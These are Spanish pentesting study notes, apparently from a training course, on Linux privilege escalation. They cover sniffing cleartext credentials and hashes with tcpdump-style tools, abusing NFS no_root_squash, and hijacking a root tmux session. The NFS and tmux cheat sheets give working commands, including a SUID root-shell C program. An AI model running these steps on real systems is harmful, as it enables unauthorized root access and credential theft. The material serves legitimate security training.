---
tags:
  - linux
  - privex
---
# Captura Pasiva de Tráfico
## Conceptos Clave (TL;DR)
* Usuarios sin privilegios podrían capturar tráfico de red si la herramienta tcpdump se encuentra instalada en el sistema.
* Este tráfico puede exponer credenciales transmitidas en protocolos de texto claro como HTTP, FTP, POP, IMAP, telnet o SMTP, útiles para escalar privilegios.
* Adicionalmente, permite capturar información sensible como números de tarjetas de crédito o cadenas de comunidad SNMP.
* Es posible capturar hashes como Net-NTLMv2, SMBv2 o Kerberos, los cuales pueden ser sometidos a ataques de fuerza bruta offline para obtener la contraseña en texto claro.

## Herramientas Clave
* **tcpdump:** Herramienta para captura de paquetes de red que puede ser explotada si está disponible para usuarios sin privilegios.
* **net-creds:** Herramienta específica para examinar datos que transitan por la red.
* **PCredz:** Utilidad para examinar y extraer credenciales e información directamente desde el tráfico de red.

## Metodología Paso a Paso
1. **Identificar herramientas de captura:** Verificar si `tcpdump` u otras herramientas de red pueden ser ejecutadas con el usuario actual.
2. **Ejecutar la captura:** Iniciar la escucha pasiva del tráfico en la interfaz de red para interceptar comunicaciones.
3. **Analizar resultados:** Utilizar herramientas o leer los archivos PCAP generados en busca de protocolos en texto claro o hashes.
4. **Crackeo Offline (Opcional):** Si se capturan hashes de autenticación (ej. NTLMv2 o Kerberos), llevarlos a la máquina atacante para realizar fuerza bruta.

## Cheat Sheet de Comandos
```bash
# Nota: El texto no provee comandos explícitos de tcpdump, pero se mencionan las herramientas a ejecutar.
# Ejecutar capturadores de red para buscar tráfico en texto claro o hashes.
net-creds
PCredz
```

## "Gotchas" y Troubleshooting
* Los protocolos modernos o cifrados no mostrarán credenciales en texto claro; el objetivo es buscar protocolos legados.
* Los hashes obtenidos no sirven directamente en la mayoría de los casos; requieren obligatoriamente un ataque de diccionario o fuerza bruta en un entorno offline.

---

# Escalada de Privilegios por NFS Débil
## Conceptos Clave (TL;DR)
* Network File System (NFS) expone archivos o directorios sobre la red en sistemas Unix/Linux a través del puerto TCP/UDP 2049.
* La configuración por defecto `root_squash` convierte al usuario root remoto en un usuario sin privilegios (`nfsnobody`), previniendo la subida de binarios SUID maliciosos.
* La mala configuración `no_root_squash` permite a los usuarios que se conectan como root crear archivos en el servidor conservando los privilegios de root local.
* Esto permite compilar un binario localmente, asignarle permisos SUID, subirlo al recurso compartido y ejecutarlo desde el servidor para obtener una shell como root.

## Herramientas Clave
* **showmount:** Permite listar remotamente las exportaciones (recursos compartidos) de un servidor NFS.
* **mount:** Utilidad local de Linux para montar el volumen NFS remoto.
* **gcc:** Compilador utilizado para crear el binario malicioso en C.
* **chmod:** Utilizado para modificar los permisos del binario y establecer el bit SUID.

## Metodología Paso a Paso
1. **Enumeración del Servidor:** Identificar recursos compartidos y revisar el archivo de configuración en el objetivo para confirmar la presencia del flag `no_root_squash`.
2. **Preparación del Payload:** Crear y compilar localmente un binario en C diseñado para ejecutar una shell (`/bin/bash`) conservando los IDs de usuario y grupo.
3. **Montaje y Transferencia:** Montar el recurso remoto en la máquina atacante, copiar el binario recién compilado al directorio montado y asignarle el bit SUID.
4. **Ejecución y Escalada:** Regresar a la sesión de bajos privilegios en la máquina objetivo, navegar al directorio montado y ejecutar el binario SUID para obtener una shell de root.

## Cheat Sheet de Comandos
```bash
# Enumera remotamente los recursos NFS compartidos del servidor usando showmount
showmount -e <TARGET_IP>

# Lee la configuración de exportaciones en el objetivo para confirmar la existencia de no_root_squash
cat /etc/exports

# Crea un archivo en C localmente que setea el UID/GID a 0 (root) y lanza una shell
cat <<EOF > shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
EOF

# Compila el código fuente en un binario ejecutable
gcc shell.c -o shell

# Monta el directorio NFS vulnerable en la máquina del atacante (requiere sudo local)
sudo mount -t nfs <TARGET_IP>:<TARGET_DIRECTORY> <LOCAL_MOUNT_POINT>

# Copia el payload al recurso montado
cp shell <LOCAL_MOUNT_POINT>

# Asigna el bit SUID al archivo dentro del recurso compartido (ejecutado por root local)
chmod u+s <LOCAL_MOUNT_POINT>/shell

# Una vez de vuelta en el servidor objetivo (como usuario de bajos privilegios), verifica los permisos SUID
ls -la <TARGET_DIRECTORY>

# Ejecuta el binario preparado para obtener acceso root
<TARGET_DIRECTORY>/shell

# Confirma los privilegios obtenidos
id
```

## "Gotchas" y Troubleshooting
* Si la configuración está establecida como `root_squash` en lugar de `no_root_squash`, el usuario propietario del archivo subido cambiará automáticamente a `nfsnobody`, frustrando la ejecución del SUID como root.
* El ataque asume que poseemos privilegios de root en la máquina atacante (Pwnbox/Kali) para realizar el comando `mount` y manipular el archivo como root local.
* NFS opera sobre el puerto 2049, asegúrate de que el enrutamiento y los firewalls permitan comunicación TCP/UDP hacia ese puerto.

---

# Tmux Hijacking
## Conceptos Clave (TL;DR)
* Tmux es un multiplexor de terminales que permite mantener sesiones activas en segundo plano incluso después de desconectarse.
* A veces, administradores dejan procesos tmux ejecutándose como root, que pueden ser secuestrados si los permisos del socket compartido son débiles o están mal configurados.
* Si un atacante compromete a un usuario que pertenece al grupo propietario del socket de tmux, puede adjuntarse a la sesión y heredar directamente los privilegios (usualmente root).

## Herramientas Clave
* **ps / grep:** Utilizados para buscar procesos tmux activos en el sistema y revelar la ruta del socket compartido.
* **id:** Usado para revisar nuestra membresía de grupos y validar si tenemos permisos de lectura/escritura sobre el socket.
* **tmux:** Comando utilizado para invocar y adjuntarse (`attach`) a la sesión compartida vulnerable.

## Metodología Paso a Paso
1. **Enumeración de procesos:** Buscar procesos tmux en ejecución y extraer la ruta utilizada por el parámetro `-S` (socket de la sesión).
2. **Validación de permisos:** Revisar la propiedad de usuario y grupo del archivo de socket (ej. `/shareds`).
3. **Verificación de grupos:** Comprobar si nuestro usuario de bajo privilegio actual pertenece al grupo propietario del archivo del socket de tmux.
4. **Secuestro de sesión:** Adjuntarse a la sesión compartida utilizando el comando tmux con la ruta identificada para tomar el control de la consola del administrador.

## Cheat Sheet de Comandos
```bash
# Busca procesos de tmux en ejecución; el output revelará el path del socket (-S)
ps aux | grep tmux

# Muestra los permisos actuales y los dueños (usuario:grupo) del archivo de socket compartido
ls -la <TMUX_SOCKET_PATH>

# Revisa los grupos a los que pertenece tu usuario actual para confirmar si cruzan con el grupo del socket
id

# Adjunta tu terminal a la sesión tmux compartida (si tienes permisos) y secuestra la shell
tmux -S <TMUX_SOCKET_PATH>
```

## "Gotchas" y Troubleshooting
* Debes pertenecer al grupo específico asignado mediante `chown` por el administrador (en este ejemplo, el grupo `devs`) para poder interactuar con el socket.
* Las sesiones se identifican mediante sockets definidos generalmente con el flag `-S` durante la creación por parte de la víctima.